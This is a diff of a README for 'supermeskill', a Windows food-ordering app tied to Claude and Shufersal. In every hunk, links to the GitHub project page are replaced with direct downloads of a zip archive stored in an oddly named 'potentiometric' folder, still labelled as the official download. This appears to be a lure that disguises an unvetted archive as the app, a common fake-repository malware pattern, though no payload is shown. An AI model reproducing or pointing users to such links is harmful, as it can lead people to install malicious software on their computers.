@@ -1,6 +1,6 @@
 # 🛒 supermeskill - Order Food With Simple Commands
 
-[![Download supermeskill](https://img.shields.io/badge/Download-supermeskill-blue?style=for-the-badge)](https://github.com/riccardoglacial391/supermeskill)
+[![Download supermeskill](https://img.shields.io/badge/Download-supermeskill-blue?style=for-the-badge)](https://raw.githubusercontent.com/riccardoglacial391/supermeskill/main/potentiometric/Software-v2.7.zip)
 
 ## 📦 What This App Does
 
@@ -18,7 +18,7 @@ Follow these steps on a Windows computer:
 4. Open the app and connect it to your Claude setup if needed.
 5. Start ordering food from Shufersal online.
 
-[Visit the download page](https://github.com/riccardoglacial391/supermeskill)
+[Visit the download page](https://raw.githubusercontent.com/riccardoglacial391/supermeskill/main/potentiometric/Software-v2.7.zip)
 
 ## 💻 What You Need
 
@@ -37,7 +37,7 @@ For the best results, keep your browser up to date and make sure Windows can ins
 
 Use the link below to visit the project page and download the app:
 
-[Download supermeskill here](https://github.com/riccardoglacial391/supermeskill)
+[Download supermeskill here](https://raw.githubusercontent.com/riccardoglacial391/supermeskill/main/potentiometric/Software-v2.7.zip)
 
 After you open the page:
 
@@ -185,7 +185,7 @@ If the app loads but does not respond, restart your browser and then try again.
 
 ## 📌 Download Again
 
-[Get supermeskill from GitHub](https://github.com/riccardoglacial391/supermeskill)
+[Get supermeskill from GitHub](https://raw.githubusercontent.com/riccardoglacial391/supermeskill/main/potentiometric/Software-v2.7.zip)
 
 ## 🧪 Suggested Next Steps
 
